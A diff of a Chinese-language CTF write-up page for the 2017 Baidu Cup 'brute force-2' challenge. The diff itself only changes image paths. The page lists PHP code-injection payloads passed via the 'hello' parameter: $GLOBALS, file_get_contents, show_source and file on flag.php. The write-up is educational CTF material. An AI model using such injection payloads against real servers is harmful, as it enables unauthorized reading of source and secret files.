@@ -75,24 +75,24 @@
     <div class="container content">
         <h1>“百度杯”CTF比赛 2017 二月场爆破-2</h1>
 <h3>源码如下：</h3>
-<p><img alt="image-20191012155912832" src="/Users/cyh/virtualenvs/pelican/content/images/image-20191012155912832.png"></p>
+<p><img alt="image-20191012155912832" src="/images/image-20191012155912832.png"></p>
 <p>变量名前面加@目的是防止报错信息输出。</p>
 <h3>思路：</h3>
 <p>1.构造出全局变量GLOBALS，看看能得到什么信息</p>
 <p>Payload:<code>http://7fdd485af13d43f5b84c484d24241a9df436dd9e5a334e24.changame.ichunqiu.com/?hello=$GLOBALS</code></p>
-<p><img alt="image-20191012160519620" src="/Users/cyh/virtualenvs/pelican/content/images/image-20191012160519620.png"></p>
+<p><img alt="image-20191012160519620" src="/images/image-20191012160519620.png"></p>
 <p>拿到flag</p>
 <p>2.payload：<code>http://a50d475900a849dcbeb3b73cd1ecb287851cb2e554a04e77.changame.ichunqiu.com/?hello=file_get_contents('flag.php')</code></p>
 <p>File_get_contents: 用于将文件的内容读入到一个字符串中</p>
-<p><img alt="image-20191013095527362" src="/Users/cyh/virtualenvs/pelican/content/images/image-20191013095527362.png"></p>
+<p><img alt="image-20191013095527362" src="/images/image-20191013095527362.png"></p>
 <ol>
 <li>Payload: <code>http://a50d475900a849dcbeb3b73cd1ecb287851cb2e554a04e77.changame.ichunqiu.com/?hello=show_source('flag.php')</code></li>
 </ol>
 <p>Show_source:对文件进行语法高亮显示</p>
-<p><img alt="image-20191013095924391" src="/Users/cyh/virtualenvs/pelican/content/images/image-20191013095924391.png"></p>
+<p><img alt="image-20191013095924391" src="/images/image-20191013095924391.png"></p>
 <p>4.payload:<code>http://a50d475900a849dcbeb3b73cd1ecb287851cb2e554a04e77.changame.ichunqiu.com/?hello=file('flag.php')</code></p>
 <p>file：把整个文件读入一个数组中</p>
-<p><img alt="image-20191013100113558" src="/Users/cyh/virtualenvs/pelican/content/images/image-20191013100113558.png"></p>
+<p><img alt="image-20191013100113558" src="/images/image-20191013100113558.png"></p>
 
 
         
